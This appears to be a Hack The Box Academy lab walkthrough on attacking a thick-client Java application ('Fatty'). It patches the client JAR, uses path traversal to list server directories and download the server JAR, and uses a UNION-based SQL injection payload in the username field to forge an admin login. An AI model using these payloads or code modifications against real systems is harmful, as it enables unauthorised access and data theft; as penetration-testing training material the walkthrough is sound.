
<h1>Exploiting Web Vulnerabilities in Thick-Client Applications</h1>
<hr/>
<p>Thick client applications with a three-tier architecture have a security advantage over those with a two-tier architecture since it prevents the end-user from communicating directly with the database server. However, three-tier applications can be susceptible to web-specific attacks like SQL Injection and Path Traversal.</p>
<p>During penetration testing, it is common for someone to encounter a thick client application that connects to a server to communicate with the database. The following scenario demonstrates a case where the tester has found the following files while enumerating an FTP server that provides <code>anonymous</code> user access.</p>
<ul>
<li>fatty-client.jar</li>
<li>note.txt</li>
<li>note2.txt</li>
<li>note3.txt</li>
</ul>
<p>Reading the content of all the text files reveals that:</p>
<ul>
<li>A server has been reconfigured to run on port <code>1337</code> instead of <code>8000</code>.</li>
<li>This might be a thick/thin client architecture where the client application still needs to be updated to use the new port.</li>
<li>The client application relies on <code>Java 8</code>.</li>
<li>The login credentials for login in the client application are <code>qtc / clarabibi</code>.</li>
</ul>
<p>Let's run the <code>fatty-client.jar</code> file by double-clicking on it. Once the app is started, we can log in using the credentials <code>qtc / clarabibi</code>.</p>
<p><img alt="err" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/err.png"/></p>
<p>This is not successful, and the message <code>Connection Error!</code> is displayed. This is probably because the port pointing to the servers needs to be updated from <code>8000</code> to <code>1337</code>. Let's capture and analyze the network traffic using Wireshark to confirm this. Once Wireshark is started, we click on <code>Login</code> once again.</p>
<p><img alt="wireshark" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/wireshark.png"/></p>
<div class="alert alert-primary fade show" role="alert">
<i class="mdi mdi-information-outline mr-2"></i> Below is showcased an example on how to approach DNS requests from applications in your favour. Verify the contents of the C:\Windows\System32\drivers\etc\hosts file where the IP 172.16.17.114 is pointed to fatty.htb and server.fatty.htb
</div>
<p>The client attempts to connect to the <code>server.fatty.htb</code> subdomain. Let's start a command prompt as administrator and add the following entry to the <code>hosts</code> file.</p>
<pre><code class="language-cmd-session">C:\&gt; echo 10.10.10.174    server.fatty.htb &gt;&gt; C:\Windows\System32\drivers\etc\hosts
</code></pre>
<p>Inspecting the traffic again reveals that the client is attempting to connect to port <code>8000</code>.</p>
<p><img alt="port" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/port.png"/></p>
<p>The <code>fatty-client.jar</code> is a Java Archive file, and its content can be extracted by right-clicking on it and selecting <code>Extract files</code>.</p>
<pre><code class="language-powershell-session">C:\&gt; ls fatty-client\

&lt;SNIP&gt;
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/30/2019  12:10 PM                htb
d-----       10/30/2019  12:10 PM                META-INF
d-----        4/26/2017  12:09 AM                org
------       10/30/2019  12:10 PM           1550 beans.xml
------       10/30/2019  12:10 PM           2230 exit.png
------       10/30/2019  12:10 PM           4317 fatty.p12
------       10/30/2019  12:10 PM            831 log4j.properties
------        4/26/2017  12:08 AM            299 module-info.class
------       10/30/2019  12:10 PM          41645 spring-beans-3.0.xsd
</code></pre>
<p>Let's run PowerShell as administrator, navigate to the extracted directory and use the <code>Select-String</code> command to search all the files for port <code>8000</code>.</p>
<pre><code class="language-powershell-session">C:\&gt; ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List

Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml
LineNumber : 13
</code></pre>
<p>There's a match in <code>beans.xml</code>. This is a <code>Spring</code> configuration file containing configuration metadata. Let's read its content.</p>
<pre><code class="language-powershell-session">C:\&gt; cat fatty-client\beans.xml

&lt;SNIP&gt;
&lt;!-- Here we have an constructor based injection, where Spring injects required arguments inside the
         constructor function. --&gt;
   &lt;bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext"&gt;
      &lt;constructor-arg index="0" value = "server.fatty.htb"/&gt;
      &lt;constructor-arg index="1" value = "8000"/&gt;
   &lt;/bean&gt;

&lt;!-- The next to beans use setter injection. For this kind of injection one needs to define an default
constructor for the object (no arguments) and one needs to define setter methods for the properties. --&gt;
   &lt;bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty"&gt;
      &lt;property name = "keystorePath" value = "fatty.p12"/&gt;
   &lt;/bean&gt;

   &lt;bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder"&gt;
      &lt;property name = "secret" value = "clarabibiclarabibiclarabibi"/&gt;
   &lt;/bean&gt;
&lt;SNIP&gt;
</code></pre>
<p>Let's edit the line <code>&lt;constructor-arg index="1" value = "8000"/&gt;</code> and set the port to <code>1337</code>. Reading the content carefully, we also notice that the value of the <code>secret</code> is <code>clarabibiclarabibiclarabibi</code>. Running the edited application will fail due to an <code>SHA-256</code> digest mismatch. The JAR is signed, validating every file's <code>SHA-256</code> hashes before running. These hashes are present in the file <code>META-INF/MANIFEST.MF</code>.</p>
<pre><code class="language-powershell-session">C:\&gt; cat fatty-client\META-INF\MANIFEST.MF

Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter

Name: META-INF/maven/org.slf4j/slf4j-log4j12/pom.properties
SHA-256-Digest: miPHJ+Y50c4aqIcmsko7Z/hdj03XNhHx3C/pZbEp4Cw=

Name: org/springframework/jmx/export/metadata/ManagedOperationParamete
 r.class
SHA-256-Digest: h+JmFJqj0MnFbvd+LoFffOtcKcpbf/FD9h2AMOntcgw=
&lt;SNIP&gt;
</code></pre>
<p>Let's remove the hashes from <code>META-INF/MANIFEST.MF</code> and delete the <code>1.RSA</code> and <code>1.SF</code> files from the <code>META-INF</code> directory. The modified <code>MANIFEST.MF</code> should end with a new line.</p>
<pre><code class="language-txt">Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter

</code></pre>
<p>We can update and run the <code>fatty-client.jar</code> file by issuing the following commands.</p>
<pre><code class="language-powershell-session">C:\&gt; cd .\fatty-client
C:\&gt; jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
</code></pre>
<p>Then, we double-click on the <code>fatty-client-new.jar</code> file to start it and try logging in using the credentials <code>qtc / clarabibi</code>.</p>
<p><img alt="login" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/login.png"/></p>
<p>This time we get the message <code>Login Successful!</code>.</p>
<hr/>
<h2>Foothold</h2>
<p>Clicking on <code>Profile</code> -&gt; <code>Whoami</code> reveals that the user <code>qtc</code> is assigned with the <code>user</code> role.</p>
<p><img alt="profile1" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/profile1.png"/></p>
<p>Clicking on the <code>ServerStatus,</code> we notice that we can't click on any options.</p>
<p><img alt="status" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/status.png"/></p>
<p>This implies that there might be another user with higher privileges that is allowed to use this feature. Clicking on the <code>FileBrowser</code> -&gt; <code>Notes.txt</code> reveals the file <code>security.txt</code>. Clicking the <code>Open</code> option at the bottom of the window shows the following content.</p>
<p><img alt="security" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/security.png"/></p>
<p>This note informs us that a few critical issues in the application still need to be fixed. Navigating to the <code>FileBrowser</code> -&gt; <code>Mail</code> option reveals the <code>dave.txt</code> file containing interesting information. We can read its content by clicking the <code>Open</code> option at the bottom of the window.</p>
<p><img alt="dave" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/dave.png"/></p>
<p>The message from dave says that all <code>admin</code> users are removed from the database. It also refers to a timeout implemented in the login procedure to mitigate time-based SQL injection attacks.</p>
<hr/>
<h2>Path Traversal</h2>
<p>Since we can read files, let's attempt a path traversal attack by giving the following payload in the field and clicking the <code>Open</code> button.</p>
<pre><code class="language-txt">../../../../../../etc/passwd
</code></pre>
<p><img alt="passwd" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/passwd.png"/></p>
<p>The server filters out the <code>/</code> character from the input. Let's decompile the application using <a href="http://java-decompiler.github.io/">JD-GUI</a>, by dragging and dropping the <code>fatty-client-new.jar</code> onto the <code>jd-gui</code>.</p>
<p><img alt="jdgui" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/jdgui.png"/></p>
<p>Save the source code by pressing the <code>Save All Sources</code> option in <code>jdgui</code>. Decompress the <code>fatty-client-new.jar.src.zip</code> by right-clicking and selecting <code>Extract files</code>. The file <code>fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java</code> handles the application features. Reading its content reveals the following code.</p>
<pre><code class="language-java">public String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "files");
    this.action.addArgument(folder);
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
  }
</code></pre>
<p>The <code>showFiles</code> function takes in one argument for the folder name and then sends the data to the server using the <code>sendAndRecv()</code> call. The file <code>fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java</code> sets the folder option. Let's read its content.</p>
<pre><code class="language-java">configs.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            ClientGuiTest.this.currentFolder = "configs";
            try {
              response = ClientGuiTest.this.invoker.showFiles("configs");
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });
</code></pre>
<p>We can replace the <code>configs</code> folder name with <code>..</code> as follows.</p>
<pre><code class="language-java">ClientGuiTest.this.currentFolder = "..";
  try {
    response = ClientGuiTest.this.invoker.showFiles("..");
</code></pre>
<p>Next, compile the <code>ClientGuiTest.Java</code> file.</p>
<pre><code class="language-powershell-session">C:\&gt; javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
</code></pre>
<p>This generates several class files. Let's create a new folder and extract the contents of <code>fatty-client-new.jar</code> into it.</p>
<pre><code class="language-powershell-session">C:\&gt; mkdir raw
C:\&gt; cp fatty-client-new.jar raw\fatty-client-new-2.jar
</code></pre>
<p>Navigate to the <code>raw</code> directory and decompress <code>fatty-client-new-2.jar</code> by right-clicking and selecting <code>Extract Here</code>. Overwrite any existing <code>htb/fatty/client/gui/*.class</code> files with updated class files.</p>
<pre><code class="language-powershell-session">C:\&gt; mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
</code></pre>
<p>Finally, we build the new JAR file.</p>
<pre><code class="language-powershell-session">C:\&gt; cd raw
C:\&gt; jar -cmf META-INF\MANIFEST.MF traverse.jar .
</code></pre>
<p>Let's log in to the application and navigate to <code>FileBrowser</code> -&gt; <code>Config</code> option.</p>
<p><img alt="traverse" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/traverse.png"/></p>
<p>This is successful. We can now see the content of the directory <code>configs/../</code>. The files <code>fatty-server.jar</code> and <code>start.sh</code> look interesting. Listing the content of the <code>start.sh</code> file reveals that <code>fatty-server.jar</code> is running inside an Alpine Docker container.</p>
<p><img alt="start" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/start.png"/></p>
<p>We can modify the <code>open</code> function in <code>fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java</code> to download the file <code>fatty-server.jar</code> as follows.</p>
<pre><code class="language-java">import java.io.FileOutputStream;
&lt;SNIP&gt;
public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {}).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user)) {
        return "Error: Method '" + methodName + "' is not allowed for this user account";
    }
    this.action = new ActionMessage(this.sessionID, "open");
    this.action.addArgument(foldername);
    this.action.addArgument(filename);
    sendAndRecv();
    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
    FileOutputStream fos = new FileOutputStream(desktopPath);
    
    if (this.response.hasError()) {
        return "Error: Your action caused an error on the application server!";
    }
    
    byte[] content = this.response.getContent();
    fos.write(content);
    fos.close();
    
    return "Successfully saved the file to " + desktopPath;
}
&lt;SNIP&gt;
</code></pre>
<p>Rebuild the JAR file by following the same steps and log in again to the application. Then, navigate to <code>FileBrowser</code> -&gt; <code>Config</code>, add the <code>fatty-server.jar</code> name in the input field, and click the <code>Open</code> button.</p>
<p><img alt="download" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/download.png"/></p>
<p>The <code>fatty-server.jar</code> file is successfully downloaded onto our desktop, and we can start the examination.</p>
<pre><code class="language-powershell-session">C:\&gt; ls C:\Users\cybervaca\Desktop\

...SNIP...
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/25/2023  11:38 AM       10827452 fatty-server.jar
</code></pre>
<hr/>
<h2>SQL Injection</h2>
<p>Decompiling the <code>fatty-server.jar</code> using JD-GUI reveals the file <code>htb/fatty/server/database/FattyDbSession.class</code> that contains a <code>checkLogin()</code> function that handles the login functionality. This function retrieves user details based on the provided username. It then compares the retrieved password with the provided password.</p>
<pre><code class="language-java">public User checkLogin(User user) throws LoginException {
    &lt;SNIP&gt;
      rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
      &lt;SNIP&gt;
        if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
          return newUser; 
        throw new LoginException("Wrong Password!");
      &lt;SNIP&gt;
           this.logger.logError("[-] Failure with SQL query: ==&gt; SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' &lt;==");
      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
      return null;
</code></pre>
<p>Let's check how the client application sends credentials to the server. The login button creates the new object <code>ClientGuiTest.this.user</code> for the <code>User</code> class. It then calls the <code>setUsername()</code> and <code>setPassword()</code> functions with the respective username and password values. The values that are returned from these functions are then sent to the server.</p>
<p><img alt="logincode" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/logincode.png"/></p>
<p>Let's check the <code>setUsername()</code> and <code>setPassword()</code> functions from <code>htb/fatty/shared/resources/user.java</code>.</p>
<pre><code class="language-java">public void setUsername(String username) {
    this.username = username;
  }
  
  public void setPassword(String password) {
    String hashString = this.username + password + "clarabibimakeseverythingsecure";
    MessageDigest digest = null;
    try {
      digest = MessageDigest.getInstance("SHA-256");
    } catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
    } 
    byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
    this.password = DatatypeConverter.printHexBinary(hash);
  }
</code></pre>
<p>The username is accepted without modification, but the password is changed to the format below.</p>
<pre><code class="language-java">sha256(username+password+"clarabibimakeseverythingsecure")
</code></pre>
<p>We also notice that the username isn't sanitized and is directly used in the SQL query, making it vulnerable to SQL injection.</p>
<pre><code class="language-java">rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
</code></pre>
<p>The <code>checkLogin</code> function in <code>htb/fatty/server/database/FattyDbSession.class</code> writes the SQL exception to a log file.</p>
<pre><code class="language-java">&lt;SNIP&gt;
    this.logger.logError("[-] Failure with SQL query: ==&gt; SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' &lt;==");
      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
&lt;SNIP&gt;
</code></pre>
<p>Login into the application using the username <code>qtc'</code> to validate the SQL injection vulnerability reveals a syntax error. To see the error, we need to edit the code in the <code>fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java</code> file as follows.</p>
<pre><code class="language-java">ClientGuiTest.this.currentFolder = "../logs";
  try {
    response = ClientGuiTest.this.invoker.showFiles("../logs");
</code></pre>
<p>Listing the content of the <code>error-log.txt</code> file reveals the following message.</p>
<p><img alt="error" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/error.png"/></p>
<p>This confirms that the username field is vulnerable to SQL Injection. However, login attempts using payloads such as <code>' or '1'='1</code> in both fields fail. Assuming that the username in the login form is <code>' or '1'='1</code>, the server will process the username as below.</p>
<pre><code class="language-sql">SELECT id,username,email,password,role FROM users WHERE username='' or '1'='1'
</code></pre>
<p>The above query succeeds and returns the first record in the database. The server then creates a new user object with the obtained results.</p>
<pre><code class="language-java">&lt;SNIP&gt;
if (rs.next()) {
        int id = rs.getInt("id");
        String username = rs.getString("username");
        String email = rs.getString("email");
        String password = rs.getString("password");
        String role = rs.getString("role");
        newUser = new User(id, username, password, email, Role.getRoleByName(role), false);
&lt;SNIP&gt;
</code></pre>
<p>It then compares the newly created user password with the user-supplied password.</p>
<pre><code class="language-java">&lt;SNIP&gt;
if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
    return newUser;
throw new LoginException("Wrong Password!");
&lt;SNIP&gt;
</code></pre>
<p>Then, the following value is produced by <code>newUser.getPassword()</code> function.</p>
<pre><code class="language-java">sha256("qtc"+"clarabibi"+"clarabibimakeseverythingsecure") = 5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046
</code></pre>
<p>The user-supplied password hash <code>user.getPassword()</code> is calculated as follows.</p>
<pre><code class="language-java">sha256("' or '1'='1" + "' or '1'='1" + "clarabibimakeseverythingsecure") = cc421e01342afabdd4857e7a1db61d43010951c7d5269e075a029f5d192ee1c8
</code></pre>
<p>Although the hash sent to the server by the client doesn't match the one in the database, and the password comparison fails, the SQL injection is still possible using <code>UNION</code> queries. Let's consider the following example.</p>
<pre><code class="language-sql">MariaDB [userdb]&gt; select * from users where username='john';
+----------+-------------+
| username | password    |
+----------+-------------+
| john     | password123 |
+----------+-------------+
</code></pre>
<p>It is possible to create fake entries using the <code>SELECT</code> operator. Let's input an invalid username to create a new user entry.</p>
<pre><code class="language-sql">MariaDB [userdb]&gt; select * from users where username='test' union select 'admin', 'welcome123';
+----------+-------------+
| username | password    |
+----------+-------------+
| admin    | welcome123  |
+----------+-------------+
</code></pre>
<p>Similarly, the injection in the <code>username</code> field can be leveraged to create a fake user entry.</p>
<pre><code class="language-java">test' UNION SELECT 1,'invaliduser','<a class="__cf_email__" data-cfemail="5930372f3835303d1938773b" href="/cdn-cgi/l/email-protection">[email protected]</a>','invalidpass','admin
</code></pre>
<p>This way, the password, and the assigned role can be controlled. The following snippet of code sends the plaintext password entered in the form. Let's modify the code in <code>htb/fatty/shared/resources/User.java</code> to submit the password as it is from the client application.</p>
<pre><code class="language-java">public User(int uid, String username, String password, String email, Role role) {
    this.uid = uid;
    this.username = username;
    this.password = password;
    this.email = email;
    this.role = role;
}
public void setPassword(String password) {
    this.password = password;
  }
</code></pre>
<p>We can now rebuild the JAR file and attempt to log in using the payload <code>abc' UNION SELECT 1,'abc','<a class="__cf_email__" data-cfemail="b2d3f2d09cd1dddf" href="/cdn-cgi/l/email-protection">[email protected]</a>','abc','admin</code> in the <code>username</code> field and the random text <code>abc</code> in the <code>password</code> field.</p>
<p><img alt="bypass" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/bypass.png"/></p>
<p>The server will eventually process the following query.</p>
<pre><code class="language-sql">select id,username,email,password,role from users where username='abc' UNION SELECT 1,'abc','<a class="__cf_email__" data-cfemail="9effdefcb0fdf1f3" href="/cdn-cgi/l/email-protection">[email protected]</a>','abc','admin'
</code></pre>
<p>The first select query fails, while the second returns valid user results with the role <code>admin</code> and the password <code>abc</code>. The password sent to the server is also <code>abc</code>, which results in a successful password comparison, and the application allows us to log in as the user <code>admin</code>.</p>
<p><img alt="admin" src="https://academy.hackthebox.com/storage/modules/113/thick_clients_web/admin.png"/></p>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="30" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="31" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="38" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="39" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="41" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="47" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg"/>
</div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
